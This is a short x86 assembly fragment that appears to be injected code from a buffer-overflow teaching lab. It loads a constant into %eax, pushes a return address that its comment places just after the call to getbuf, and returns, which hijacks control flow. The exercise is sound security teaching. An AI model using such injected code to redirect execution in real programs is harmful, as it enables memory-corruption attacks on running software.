movl $0x1e46ede3, %eax
pushl $0x0804954c #pushes right after test calls getbuf so it does not call gb
ret
